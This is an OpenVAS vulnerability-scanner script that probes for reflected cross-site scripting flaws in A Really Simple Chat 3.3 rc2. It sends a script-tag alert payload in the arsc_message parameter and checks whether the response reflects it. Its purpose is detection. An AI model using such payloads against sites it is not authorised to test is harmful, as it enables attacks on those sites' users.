###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_arsc_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# A Really Simple Chat Multiple XSS Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to inject arbitrary web script
  or HTML by executing arbitrary scripts.
  Impact Level: Application";
tag_affected = "A Really Simple Chat version 3.3 rc2.";
tag_insight = "The flaws are due to improper validation of user supplied data in the
  'arsc_link' parameter in dereferer.php and 'arsc_message' parameter in
  login.php, which allow attacker to execute arbitrary scripts.";
tag_solution = "No solution or patch is available as of 30th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/arsc/";
tag_summary = "The host is running A Really Simple Chat and is prone to multiple
  cross site scripting vulnerabilities.";

if(description)
{
  script_id(902607);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-05 13:15:06 +0200 (Tue, 05 Jul 2011)");
  script_cve_id("CVE-2011-2180", "CVE-2011-2470");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("A Really Simple Chat Multiple XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14050/");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2011/06/02/7");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2011/06/02/1");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/xss_in_a_really_simple_chat_arsc.html");

  script_description(desc);
  script_summary("Determine if A Really Simple Chat is prone to XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("/arsc", "/base","/chat", "", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/chat/base/index.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if("Powered by ARSC" >< rcvRes)
  {
    attack = "/chat/base/admin/login.php?arsc_message=<script>alert" +
             "('OpenVAS-XSS-TEST')</script>";

    ## Construct attack request
    req = http_get (item: string(dir, attack), port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    ## Confirm the exploit
    if(("<script>alert('OpenVAS-XSS-TEST')</script>">< res))
    {
      security_warning(port);
      exit(0);
    }
  }
}
